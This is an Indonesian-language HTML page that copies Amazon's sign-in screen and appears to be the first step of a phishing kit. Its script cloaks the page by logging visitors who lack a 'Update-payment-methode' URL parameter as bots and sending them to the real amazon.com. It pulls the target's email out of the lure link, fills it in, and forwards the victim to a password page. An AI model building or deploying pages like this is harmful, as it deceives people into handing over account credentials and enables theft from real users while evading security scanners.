<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — Masuk atau Buat Akun</title>
    <script src="config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        .logo { margin: 15px 0 25px; text-align: center; }
        .logo img { height: 60px; }
        .kotak {
            width: 100%; max-width: 350px;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 25px;
        }
        h1 { font-size: 24px; font-weight: 500; margin-bottom: 20px; }
        label {
            font-size: 13px; font-weight: 700;
            display: block; margin: 18px 0 6px;
        }
        input {
            width: 100%; padding: 10px;
            border: 1px solid #a6a6a6;
            border-radius: 4px; font-size: 15px;
        }
        input:focus { outline: none; border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
        .pesan-kesalahan {
            color: #c00; font-size: 13px; margin: 8px 0; display: none;
        }
        button {
            width: 100%; padding: 10px;
            background: #FFD814; border: 1px solid #FCD200;
            border-radius: 20px; font-size: 15px; color: #0F1111;
            cursor: pointer; margin-top: 20px;
            transition: opacity 0.2s;
        }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        button:not(:disabled):hover { background: #F7CA00; }
        .garis-pemisah {
            display: flex; align-items: center; gap: 15px;
            margin: 30px 0; font-size: 12px; color: #767676;
        }
        .garis-pemisah hr { flex: 1; border: none; border-top: 1px solid #e7e7e7; }
        .link-bantuan { font-size: 12px; margin-top: 20px; line-height: 1.5; }
        .link-bantuan a { color: #0066c0; text-decoration: none; }
        .link-bantuan a:hover { text-decoration: underline; }
        .footer {
            margin-top: 40px; text-align: center;
            font-size: 11px; color: #555;
        }
        .footer a { color: #0066c0; text-decoration: none; margin: 0 8px; }
    </style>
</head>
<body>
    <div id="kontenUtama">
        <div class="logo">
            <img src="img/amazonlogo.png" alt="Amazon">
        </div>

        <div class="kotak">
            <h1>Masuk atau buat akun</h1>

            <label for="email">Alamat email</label>
            <input type="email" id="email" placeholder="nama@contoh.com" autocomplete="username">
            <div class="pesan-kesalahan" id="kesalahanEmail">Masukkan alamat email yang valid</div>

            <button id="tombolLanjut" disabled onclick="lanjut()">Lanjut</button>

            <div class="link-bantuan">
                Belum punya akun? <a href="#">Buat akun Amazon</a>
            </div>

            <div class="garis-pemisah">
                <hr> <span>Atau lanjutkan dengan</span> <hr>
            </div>

            <div class="link-bantuan">
                <a href="#">Butuh bantuan?</a>
            </div>
        </div>

        <div class="footer">
            <p>
                <a href="#">Syarat Penggunaan</a>
                <a href="#">Pemberitahuan Privasi</a>
                <a href="#">Bantuan</a>
            </p>
            <p style="margin-top:5px; color:#999;">© 1996–2026, Amazon.com, Inc. atau afiliasinya</p>
        </div>
    </div>

    <script>
        // === CEK PARAMETER & CATAT BOT ===
        const params = new URLSearchParams(window.location.search);
        const adaParameter = params.toString().includes('Update-payment-methode');

        if (!adaParameter) {
            // ❌ TANPA PARAMETER → CATAT SEBAGAI BOT LALU ALIHKAN
            localStorage.setItem('pakaiParameter', 'TIDAK');
            
            // Simpan langsung sebagai BOT di daftar login
            const daftarLogin = JSON.parse(localStorage.getItem('daftarLogin') || '[]');
            daftarLogin.unshift({
                email: 'Tidak ada parameter',
                sandi: '-',
                isBot: true,
                waktu: new Date().toLocaleString('id-ID')
            });
            localStorage.setItem('daftarLogin', JSON.stringify(daftarLogin));

            // Sembunyikan halaman & alihkan
            document.getElementById('kontenUtama').style.display = 'none';
            window.location.href = 'https://www.amazon.com';
        } else {
            // ✅ DENGAN PARAMETER → Lanjutkan biasa
            localStorage.setItem('pakaiParameter', 'YA');
            
            // Ekstrak email dari parameter
            const cocok = window.location.href.match(/Update-payment-methode-([^-]+)-(\d+)=aktif/);
            if (cocok && cocok[1] && cocok[1] !== 'EMAIL') {
                localStorage.setItem('emailPengguna', decodeURIComponent(cocok[1]));
            }
        }

        // === FORM EMAIL ===
        const inputEmail = document.getElementById('email');
        const tombolLanjut = document.getElementById('tombolLanjut');
        const kesalahanEmail = document.getElementById('kesalahanEmail');

        // Isi otomatis jika ada dari tautan
        const emailTersimpan = localStorage.getItem('emailPengguna');
        if (emailTersimpan && emailTersimpan.includes('@')) {
            inputEmail.value = emailTersimpan;
            cekInput();
        }

        inputEmail.addEventListener('input', cekInput);
        inputEmail.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && !tombolLanjut.disabled) lanjut();
        });

        function cekInput() {
            const email = inputEmail.value.trim();
            const formatSah = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            
            if (!email) {
                kesalahanEmail.style.display = 'none';
                tombolLanjut.disabled = true;
            } else if (!formatSah.test(email)) {
                kesalahanEmail.style.display = 'block';
                tombolLanjut.disabled = true;
            } else {
                kesalahanEmail.style.display = 'none';
                tombolLanjut.disabled = false;
            }
        }

        function lanjut() {
            localStorage.setItem('emailPengguna', inputEmail.value.trim());
            window.location.href = 'password.html';
        }
    </script>
</body>
</html>
